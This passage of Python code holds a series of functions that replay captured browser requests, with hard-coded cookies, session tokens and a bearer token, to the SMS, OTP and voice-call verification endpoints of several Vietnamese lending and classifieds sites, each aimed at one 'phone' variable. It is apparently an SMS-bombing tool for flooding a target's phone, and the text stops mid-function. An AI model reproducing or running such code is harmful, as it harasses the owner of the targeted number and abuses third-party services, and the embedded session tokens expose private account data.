        'UserMachineId_etag': '37a4c894-39f5-483b-b80c-c7364f4f2a2d',
        'UserMachineId_cache': '37a4c894-39f5-483b-b80c-c7364f4f2a2d',
        'UserMachineId': '37a4c894-39f5-483b-b80c-c7364f4f2a2d',
        '_ga_LCPCW0ZYR8': 'GS1.1.1695661049.1.1.1695661056.53.0.0',
        '_ga': 'GA1.2.1395969707.1695661050',
        'Marker': 'MarkerInfo=wx1i0R/oKtEl9GjTMrtSTaE3ybM7vjtIWwRIEIweoc4=',
    }

    headers = {
        'authority': 'moneyveo.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'CaptchaCookieKey=0; ASP.NET_SessionId=hcmz4hgdpxebkega4oelv22w; language=vi; RequestData=7d329d0f-bd34-4f04-a146-11c2e947a6ea; UserTypeMarketing=L0; _gid=GA1.2.63309620.1695661050; __sbref=jcliwyxlufjtnwoeadraidatfernbmkgiaccsnti; UserMachineId_png=37a4c894-39f5-483b-b80c-c7364f4f2a2d; UserMachineId_etag=37a4c894-39f5-483b-b80c-c7364f4f2a2d; UserMachineId_cache=37a4c894-39f5-483b-b80c-c7364f4f2a2d; UserMachineId=37a4c894-39f5-483b-b80c-c7364f4f2a2d; _ga_LCPCW0ZYR8=GS1.1.1695661049.1.1.1695661056.53.0.0; _ga=GA1.2.1395969707.1695661050; Marker=MarkerInfo=wx1i0R/oKtEl9GjTMrtSTaE3ybM7vjtIWwRIEIweoc4=',
        'origin': 'https://moneyveo.vn',
        'referer': 'https://moneyveo.vn/vi/registernew/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-7467cbdf19221f1b8f4db63f43a57aa3-df61894c166522a1-00',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone[0:3]+" "+phone[3:6]+" "+phone[6:10],
    }

    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)
###
def callrs():
    cookies = {
        'CaptchaCookieKey': '0',
        'ASP.NET_SessionId': 'hcmz4hgdpxebkega4oelv22w',
        'language': 'vi',
        'RequestData': '7d329d0f-bd34-4f04-a146-11c2e947a6ea',
        'UserTypeMarketing': 'L0',
        '_gid': 'GA1.2.63309620.1695661050',
        '__sbref': 'jcliwyxlufjtnwoeadraidatfernbmkgiaccsnti',
        'UserMachineId_png': '37a4c894-39f5-483b-b80c-c7364f4f2a2d',
        'UserMachineId_etag': '37a4c894-39f5-483b-b80c-c7364f4f2a2d',
        'UserMachineId_cache': '37a4c894-39f5-483b-b80c-c7364f4f2a2d',
        'UserMachineId': '37a4c894-39f5-483b-b80c-c7364f4f2a2d',
        '_ga_LCPCW0ZYR8': 'GS1.1.1695661049.1.1.1695661056.53.0.0',
        '_ga': 'GA1.2.1395969707.1695661050',
        'Marker': 'MarkerInfo=ULndjRTxBaeMTs8zLpprJ65MO7Kx67RYvxr9AAk3ZXg=',
    }

    headers = {
        'authority': 'moneyveo.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'CaptchaCookieKey=0; ASP.NET_SessionId=hcmz4hgdpxebkega4oelv22w; language=vi; RequestData=7d329d0f-bd34-4f04-a146-11c2e947a6ea; UserTypeMarketing=L0; _gid=GA1.2.63309620.1695661050; __sbref=jcliwyxlufjtnwoeadraidatfernbmkgiaccsnti; UserMachineId_png=37a4c894-39f5-483b-b80c-c7364f4f2a2d; UserMachineId_etag=37a4c894-39f5-483b-b80c-c7364f4f2a2d; UserMachineId_cache=37a4c894-39f5-483b-b80c-c7364f4f2a2d; UserMachineId=37a4c894-39f5-483b-b80c-c7364f4f2a2d; _ga_LCPCW0ZYR8=GS1.1.1695661049.1.1.1695661056.53.0.0; _ga=GA1.2.1395969707.1695661050; Marker=MarkerInfo=ULndjRTxBaeMTs8zLpprJ65MO7Kx67RYvxr9AAk3ZXg=',
        'origin': 'https://moneyveo.vn',
        'referer': 'https://moneyveo.vn/vi/registernew/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-619d3bd360e59e98ba0ca0f17f380de2-14034964321c97cf-00',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone[0:3]+" "+phone[3:6]+" "+phone[6:10],
    }

    response = requests.post('https://moneyveo.vn/vi/registernew/resendsmstokenjson/', cookies=cookies, headers=headers, data=data)
####
def homecre():
    cookies = {
        'lang': 'vi-VN',
        'TS01eb369c': '01798ff5ed368684065e638768d4652300fd9d5b8dce30ff5fae271c4d99d96bc7abd839c72e7a8ed48bc0b81057f08d5cc6dc2bdd',
        '_gid': 'GA1.2.1074355236.1695527500',
        '_gcl_au': '1.1.439488074.1695527500',
        '_ga': 'GA1.3.1698584060.1695527500',
        '_gid': 'GA1.3.1074355236.1695527500',
        'c': 'Yl8CO7x8-1695527500637-5a99671bbadc6-1159346087',
        '_ga_HQ2YVF8108': 'GS1.3.1695527503.1.1.1695527503.0.0.0',
        'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'y4dUc7y5TMmAzkYBKrxi2A/PYoNMqg7QnozmiqB1Ras=',
        '_fbp': 'fb.1.1695527504244.1717572599',
        '_tt_enable_cookie': '1',
        '_ttp': 'yD8I45D_OBdRuHV78f4uWIruB1W',
        '_fmdata': 'MUeTzqjsY6O01Vy80wAypPRufLWyV5f8RsuG3REuddrJ1Sn3BLfdsVYL6pmPDu9WtgNISpYaglh8H8PyPbpufA%3D%3D',
        '_xid': 'nIrMQJKZZeLOIO63G2O4FMa4kmqnpEqNXjsWkT2T5Fk%3D',
        '_ga': 'GA1.2.1698584060.1695527500',
        'MgidSensorNVis': '2',
        'MgidSensorHref': 'https://vaytienmat.homecredit.vn/nhap-thong-tin-vay',
        '_gat': '1',
        'trackingId': '0000cf37-3428-4a7e-87b3-f389870bd50a',
        '_ga_9H7XV0QXGV': 'GS1.1.1695527503.1.1.1695527601.37.0.0',
        '_ga_HQ2YVF8108': 'GS1.2.1695527503.1.1.1695527601.0.0.0',
    }

    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Access-Control-Allow-Origin': '*',
        'Authorization': 'Bearer 03AFcWeA6Xf99D6OoCCrZo6W22u_1sHQQgK2tf_lZv83Nd8Jo2yinf4Rp0fI511uwpMxIbaY4i7_D6L7SWqyyO5Qz7oSJ-6KC_tE6wvSfgMcKYUmytJ1YZoo1k7ITqP0r9_ihcKkP9xOEi-iG9f8o5F4AL6cm6Juq239oYWmJH7FylhT9QfEaf5tc2KhuLqtopUbVnQ89Pw3YtPNJwK5UHzcnk_fL2G8hzD9P0_LxN3OVVSP2eVyFGnaMl8-MfpamtnnSuWGAFz_ajLuNafbVERSzwrgik9qtlbOJqWHMxeC0WRoYQxdEoDRlyqz1kb1KALQl4_YyNiQxGVJA4xnlZaHR3fwU6K9RHhFF8qxTTpQbScWHhr5d8r93DqA-sdPJ3_xLxFDKEIaBS0vuBoWCaZ47FI8n1FaP8P85FkfPADCwvgc5THSDeByivhtUx7KEV7fPb2fN3IGX5midg1NnC52_28qDMJ52LjYXcB9Mn08kQzrfmtv3Cl-xN4y2Sx87Dzkyao5WYwHHgoei2Uwvgau6OM0xaWWP43UvGU3Ygwij926_e4N9HE5YykN2rnTk1wz3-DNRJ8up-DKrdxYMJUOW48TZExFwLlLLRcG1ykMJKr3IyspKbqi0s95nA_itKbuvzkrPI3uRb',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'lang=vi-VN; TS01eb369c=01798ff5ed368684065e638768d4652300fd9d5b8dce30ff5fae271c4d99d96bc7abd839c72e7a8ed48bc0b81057f08d5cc6dc2bdd; _gid=GA1.2.1074355236.1695527500; _gcl_au=1.1.439488074.1695527500; _ga=GA1.3.1698584060.1695527500; _gid=GA1.3.1074355236.1695527500; c=Yl8CO7x8-1695527500637-5a99671bbadc6-1159346087; _ga_HQ2YVF8108=GS1.3.1695527503.1.1.1695527503.0.0.0; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=y4dUc7y5TMmAzkYBKrxi2A/PYoNMqg7QnozmiqB1Ras=; _fbp=fb.1.1695527504244.1717572599; _tt_enable_cookie=1; _ttp=yD8I45D_OBdRuHV78f4uWIruB1W; _fmdata=MUeTzqjsY6O01Vy80wAypPRufLWyV5f8RsuG3REuddrJ1Sn3BLfdsVYL6pmPDu9WtgNISpYaglh8H8PyPbpufA%3D%3D; _xid=nIrMQJKZZeLOIO63G2O4FMa4kmqnpEqNXjsWkT2T5Fk%3D; _ga=GA1.2.1698584060.1695527500; MgidSensorNVis=2; MgidSensorHref=https://vaytienmat.homecredit.vn/nhap-thong-tin-vay; _gat=1; trackingId=0000cf37-3428-4a7e-87b3-f389870bd50a; _ga_9H7XV0QXGV=GS1.1.1695527503.1.1.1695527601.37.0.0; _ga_HQ2YVF8108=GS1.2.1695527503.1.1.1695527601.0.0.0',
        'Origin': 'https://vaytienmat.homecredit.vn',
        'Referer': 'https://vaytienmat.homecredit.vn/nhap-thong-tin-vay',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'credentials': 'include',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
        'phoneNumber': phone,
    }

    response = requests.post('https://vaytienmat.homecredit.vn/api/bod-generateOTP', cookies=cookies, headers=headers, json=json_data)
###
def shinhan():
    cookies = {
        'NSC_QM_QSE_QSE_DpsqXfcOfx_MC_8002': 'ffffffff099c306345525d5f4f58455e445a4a422972',
        '_gcl_au': '1.1.159567413.1695660145',
        '_tt_enable_cookie': '1',
        '_ttp': 'TE0FpK88QO-PFnzD3ilCmYefCCc',
        '_gid': 'GA1.3.1736970233.1695660145',
        '_gat_UA-142974963-1': '1',
        '_fbp': 'fb.2.1695660145426.2097975726',
        '_ga': 'GA1.1.1487951230.1695660145',
        '_ga_7009G6MDKY': 'GS1.1.1695660145.1.1.1695660182.23.0.0',
        '_ga_VTRYZ49X0C': 'GS1.1.1695660144.1.1.1695660182.0.0.0',
    }

    headers = {
        'authority': 'shinhanfinance.com.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/json',
        # 'cookie': 'NSC_QM_QSE_QSE_DpsqXfcOfx_MC_8002=ffffffff099c306345525d5f4f58455e445a4a422972; _gcl_au=1.1.159567413.1695660145; _tt_enable_cookie=1; _ttp=TE0FpK88QO-PFnzD3ilCmYefCCc; _gid=GA1.3.1736970233.1695660145; _gat_UA-142974963-1=1; _fbp=fb.2.1695660145426.2097975726; _ga=GA1.1.1487951230.1695660145; _ga_7009G6MDKY=GS1.1.1695660145.1.1.1695660182.23.0.0; _ga_VTRYZ49X0C=GS1.1.1695660144.1.1.1695660182.0.0.0',
        'origin': 'https://shinhanfinance.com.vn',
        'referer': 'https://shinhanfinance.com.vn/leadform?productId=9273&step=1&salary=12343742&expectedBudget=100000000&tenure=12&purposeId=5847',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    }

    json_data = {
        'sessionId': 'b3h7etpdtgk9',
        'mobile': phone,
        'language': 'vi',
    }

    response = requests.post('https://shinhanfinance.com.vn/api/leads/sendOTP', cookies=cookies, headers=headers, json=json_data)
def call3():
    cookies = {
        '_fbp': 'fb.1.1695527037206.1183749290',
        '_gcl_au': '1.1.1904553417.1695527037',
        'mousestats_vi': 'f2fb94f606dcac9a9c10',
        '_gid': 'GA1.2.1357112623.1695527038',
        '_tt_enable_cookie': '1',
        '_ttp': 'qKAC_oWqQ_O39eTO7WC3slUmm0I',
        '_clck': 'i3y1li|2|ffa|0|1362',
        '_ym_uid': '1695527039374224192',
        '_ym_d': '1695527039',
        '_ym_isad': '2',
        'supportOnlineTalkID': '1TApr7ydw6zdrTd27b451EvnveCHJgOt',
        '_ym_visorc': 'w',
        'mousestats_si': '0787da58244c9e370cc4',
        '__cfruid': 'f0c88f423a768d2f388bb2f437fb45ade7b80841-1695532423',
        'XSRF-TOKEN': 'eyJpdiI6Ii9qVVVKYnp0ZDN6RWt2V1V0L0NrbHc9PSIsInZhbHVlIjoiZTV3OTJ6N2JiZFYyVElXb0pLNmN2THBQU3FzaHNwK0ZiMCtlb2pVdFpWM1dKa00xWDllSlBqclZVekdUa2Fzbjl0d0N2Mzk2RGc3c215MXlSektlNjFCSlJpMGtNWHJwTkdEZld5NHlkcEFmTjRpd2U4d0w2Mjg5OStuc0ptMkQiLCJtYWMiOiI0NDgyOTE2NTUxM2ZhY2M1YTdhN2VkNjcwYzM3MDNiOTZlOGJhNTE0N2M0OGQ3OGVhZjUzYmNiMjRiZDM5MDdlIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IlczYzgrSU9oSTBBcitFS2t0V08vUnc9PSIsInZhbHVlIjoiMGUxZVQwVXdVTG5RUkNqMllQOXhuMjZNTE1VejJlam80NUo0NDlwR0gwZENQeW5WMWZRVlpOTmR4SjRHbmw5eWM5V1dkVDJ2bnFxVmk2bTRBNUp3emhvVkdVZkdkSlp6a1U4bFF2MVhIWUVjT1BRc09JVTNkUlVvZnhrSVk5cjQiLCJtYWMiOiJmNjJmMTJiMzMzMzQxODcwMjJmZjcwOTkwZGRlNWZmMWQwMTRjNjEyODc4YTE5NTliMWE5MDlhYWNiOWI4ZTcwIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6Ik51dlFKb2hVTFZvRmF3ZVp6cjJyUEE9PSIsInZhbHVlIjoiMnJaSHRVdGQ3Y2ovN055Rk1VZWRkTXZWZDE3MGJvNmxNSllGNXBEbVpGQjRWQnFuZjVDYXNqSTMrVTFRMzVsVW5TWUR5eWcxRWFYYjE1MlI3a25QZ1JFN2htVkFCUDlnNUhyd1JOcWVaTWp1Z2RSTm1wSlRKcE41YVlSV3ZVQ1oiLCJtYWMiOiI2YjI4YjZlYTAyMjFkYTk2M2U0YzEwNTBiYTU5YWFmNWY1OGNhNjU5ODBiNDZiMjFlMTBhM2E4NTg2ODhiZTg3IiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '3d0d8ba3-51ab-4dac-c081-e0a8c552c34c',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '3d0d8ba3-51ab-4dac-c081-e0a8c552c34c',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_client': 'false',
        'ec_etag_client_utm': 'null',
        'ec_etag_utm': '3d0d8ba3-51ab-4dac-c081-e0a8c552c34c',
        '_ga': 'GA1.1.1211539236.1695527038',
        '_clsk': '1g0u21g|1695532425748|4|1|q.clarity.ms/collect',
        'uid': '3d0d8ba3-51ab-4dac-c081-e0a8c552c34c',
        'client': 'false',
        'client_utm': 'null',
        '_ga_EBK41LH7H5': 'GS1.1.1695527037.1.1.1695532439.35.0.0',
    }

    headers = {
        'authority': 'robocash.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_fbp=fb.1.1695527037206.1183749290; _gcl_au=1.1.1904553417.1695527037; mousestats_vi=f2fb94f606dcac9a9c10; _gid=GA1.2.1357112623.1695527038; _tt_enable_cookie=1; _ttp=qKAC_oWqQ_O39eTO7WC3slUmm0I; _clck=i3y1li|2|ffa|0|1362; _ym_uid=1695527039374224192; _ym_d=1695527039; _ym_isad=2; supportOnlineTalkID=1TApr7ydw6zdrTd27b451EvnveCHJgOt; _ym_visorc=w; mousestats_si=0787da58244c9e370cc4; __cfruid=f0c88f423a768d2f388bb2f437fb45ade7b80841-1695532423; XSRF-TOKEN=eyJpdiI6Ii9qVVVKYnp0ZDN6RWt2V1V0L0NrbHc9PSIsInZhbHVlIjoiZTV3OTJ6N2JiZFYyVElXb0pLNmN2THBQU3FzaHNwK0ZiMCtlb2pVdFpWM1dKa00xWDllSlBqclZVekdUa2Fzbjl0d0N2Mzk2RGc3c215MXlSektlNjFCSlJpMGtNWHJwTkdEZld5NHlkcEFmTjRpd2U4d0w2Mjg5OStuc0ptMkQiLCJtYWMiOiI0NDgyOTE2NTUxM2ZhY2M1YTdhN2VkNjcwYzM3MDNiOTZlOGJhNTE0N2M0OGQ3OGVhZjUzYmNiMjRiZDM5MDdlIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IlczYzgrSU9oSTBBcitFS2t0V08vUnc9PSIsInZhbHVlIjoiMGUxZVQwVXdVTG5RUkNqMllQOXhuMjZNTE1VejJlam80NUo0NDlwR0gwZENQeW5WMWZRVlpOTmR4SjRHbmw5eWM5V1dkVDJ2bnFxVmk2bTRBNUp3emhvVkdVZkdkSlp6a1U4bFF2MVhIWUVjT1BRc09JVTNkUlVvZnhrSVk5cjQiLCJtYWMiOiJmNjJmMTJiMzMzMzQxODcwMjJmZjcwOTkwZGRlNWZmMWQwMTRjNjEyODc4YTE5NTliMWE5MDlhYWNiOWI4ZTcwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6Ik51dlFKb2hVTFZvRmF3ZVp6cjJyUEE9PSIsInZhbHVlIjoiMnJaSHRVdGQ3Y2ovN055Rk1VZWRkTXZWZDE3MGJvNmxNSllGNXBEbVpGQjRWQnFuZjVDYXNqSTMrVTFRMzVsVW5TWUR5eWcxRWFYYjE1MlI3a25QZ1JFN2htVkFCUDlnNUhyd1JOcWVaTWp1Z2RSTm1wSlRKcE41YVlSV3ZVQ1oiLCJtYWMiOiI2YjI4YjZlYTAyMjFkYTk2M2U0YzEwNTBiYTU5YWFmNWY1OGNhNjU5ODBiNDZiMjFlMTBhM2E4NTg2ODhiZTg3IiwidGFnIjoiIn0%3D; ec_cache_utm=3d0d8ba3-51ab-4dac-c081-e0a8c552c34c; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=3d0d8ba3-51ab-4dac-c081-e0a8c552c34c; ec_png_client=false; ec_png_client_utm=null; ec_etag_client=false; ec_etag_client_utm=null; ec_etag_utm=3d0d8ba3-51ab-4dac-c081-e0a8c552c34c; _ga=GA1.1.1211539236.1695527038; _clsk=1g0u21g|1695532425748|4|1|q.clarity.ms/collect; uid=3d0d8ba3-51ab-4dac-c081-e0a8c552c34c; client=false; client_utm=null; _ga_EBK41LH7H5=GS1.1.1695527037.1.1.1695532439.35.0.0',
        'origin': 'https://robocash.vn',
        'referer': 'https://robocash.vn/register',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '_token': 'O1wnop64TGdalOqtPlMvhLF99geUkAxPvRP6GKos',
    }

    response = requests.post('https://robocash.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
def call4():
    cookies = {
        '_gid': 'GA1.2.26212608.1695533156',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1695533155.1.1.1695533169.46.0.0',
        '_ga': 'GA1.2.154947932.1695533156',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.26212608.1695533156; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1695533155.1.1.1695533169.46.0.0; _ga=GA1.2.154947932.1695533156',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/registration/reg1',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'mobile_phone': '84'+phone[1:11],
    }

    response = requests.post('https://api.dongplus.vn/api/v2/user/check-phone', cookies=cookies, headers=headers, json=json_data)
def call5():
    cookies = {
        '_gcl_au': '1.1.842199874.1695554382',
        '_gid': 'GA1.2.2082346579.1695554382',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_2281843': '0',
        '_hjSession_2281843': 'eyJpZCI6ImJiNjM0YjVkLWQxMzEtNGQ4OS1hOTRmLWFiMjIwYzhmMWJiNyIsImNyZWF0ZWQiOjE2OTU1NTQzODI0NzcsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'U2q9_g7uOSjbT_n90LRQMocXcYp',
        '_fbp': 'fb.1.1695554382651.1400857930',
        '_fw_crm_v': '0cc660e3-9b59-4c3d-e5c1-7a3a4c4da495',
        '_hjIncludedInSessionSample_2281853': '0',
        '_hjSession_2281853': 'eyJpZCI6IjAyZTk0Zjk1LWQ3NTctNGViYS05MjgxLTAyNzE0YjU5ZWU4YyIsImNyZWF0ZWQiOjE2OTU1NTQzOTA5OTgsImluU2FtcGxlIjpmYWxzZX0=',
        '_gat_UA-187725374-2': '1',
        '_hjSessionUser_2281843': 'eyJpZCI6IjI1NWZkZjUyLWJiNDItNWQyZS1hNGRiLTE2ZjQ4N2RiOTNlYyIsImNyZWF0ZWQiOjE2OTU1NTQzODI0NzYsImV4aXN0aW5nIjp0cnVlfQ==',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM1NTgwNjgwNw.NFzhCjlvyLtI2QRI4mLa8xW09juSfF_ipp4XQFzDxv8',
        '_ga_ZBQ18M247M': 'GS1.1.1695554382.1.1.1695554456.52.0.0',
        '_gat_UA-187725374-1': '1',
        '_ga_ZN0EBP68G5': 'GS1.1.1695554391.1.1.1695554456.60.0.0',
        '_hjSessionUser_2281853': 'eyJpZCI6IjY5NjYzYjU3LWE2MWMtNWQwMC1hMWE2LTY4ZTEzOTllMzU2ZiIsImNyZWF0ZWQiOjE2OTU1NTQzOTA5OTUsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga': 'GA1.2.1693527442.1695554382',
    }

    headers = {
        'authority': 'lk.takomo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.842199874.1695554382; _gid=GA1.2.2082346579.1695554382; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6ImJiNjM0YjVkLWQxMzEtNGQ4OS1hOTRmLWFiMjIwYzhmMWJiNyIsImNyZWF0ZWQiOjE2OTU1NTQzODI0NzcsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=U2q9_g7uOSjbT_n90LRQMocXcYp; _fbp=fb.1.1695554382651.1400857930; _fw_crm_v=0cc660e3-9b59-4c3d-e5c1-7a3a4c4da495; _hjIncludedInSessionSample_2281853=0; _hjSession_2281853=eyJpZCI6IjAyZTk0Zjk1LWQ3NTctNGViYS05MjgxLTAyNzE0YjU5ZWU4YyIsImNyZWF0ZWQiOjE2OTU1NTQzOTA5OTgsImluU2FtcGxlIjpmYWxzZX0=; _gat_UA-187725374-2=1; _hjSessionUser_2281843=eyJpZCI6IjI1NWZkZjUyLWJiNDItNWQyZS1hNGRiLTE2ZjQ4N2RiOTNlYyIsImNyZWF0ZWQiOjE2OTU1NTQzODI0NzYsImV4aXN0aW5nIjp0cnVlfQ==; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM1NTgwNjgwNw.NFzhCjlvyLtI2QRI4mLa8xW09juSfF_ipp4XQFzDxv8; _ga_ZBQ18M247M=GS1.1.1695554382.1.1.1695554456.52.0.0; _gat_UA-187725374-1=1; _ga_ZN0EBP68G5=GS1.1.1695554391.1.1.1695554456.60.0.0; _hjSessionUser_2281853=eyJpZCI6IjY5NjYzYjU3LWE2MWMtNWQwMC1hMWE2LTY4ZTEzOTllMzU2ZiIsImNyZWF0ZWQiOjE2OTU1NTQzOTA5OTUsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.2.1693527442.1695554382',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/?phone='+phone+'&amount=10000000&term=30&utm_source=goodaff_cps&utm_medium=cpa&utm_campaign=for-lead&utm_content=2&click_id=31619c4e717418dc6dcc532fc3339d17',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'data': {
            'phone': phone,
            'code': 'resend',
            'channel': 'ivr',
        },
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
###
def call6():
    headers = {
        'authority': 'api.findo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.findo.vn',
        'referer': 'https://www.findo.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'mobilePhone': {
            'number': phone,
        },
    }

    response = requests.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', headers=headers, json=json_data)
def muaban():
    cookies = {
        '_gcl_au': '1.1.1958768879.1695660814',
        '_hjSessionUser_2465791': 'eyJpZCI6IjJhN2YzMTgwLTQ3N2MtNWQ3MC05MGM2LWFkYThiM2QyNTVhMiIsImNyZWF0ZWQiOjE2OTU2NjA4MTQzMzEsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_2465791': '1',
        '_hjSession_2465791': 'eyJpZCI6IjVkZmVkMGQ0LTA2NjgtNDJlYS1hNDFmLTE5YjkxOTc2MWZiZCIsImNyZWF0ZWQiOjE2OTU2NjA4MTQzMzMsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '0',
        '_fbp': 'fb.1.1695660814522.1283895341',
        '_tt_enable_cookie': '1',
        '_ttp': '7XcIIhGYGs2aK8nDIsm5VT8EbTr',
        '__gads': 'ID=9a1a3acde39ca731-22e58b6512e40037:T=1695660813:RT=1695660813:S=ALNI_MabqUCaZIs0oW1idOjkPniSiA355Q',
        '__gpi': 'UID=00000c54099d30d8:T=1695660813:RT=1695660813:S=ALNI_MbZGtbS5V7dig3WfaJFOAiEoOzkUg',
    }

    headers = {
        'authority': 'muaban.net',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/json',
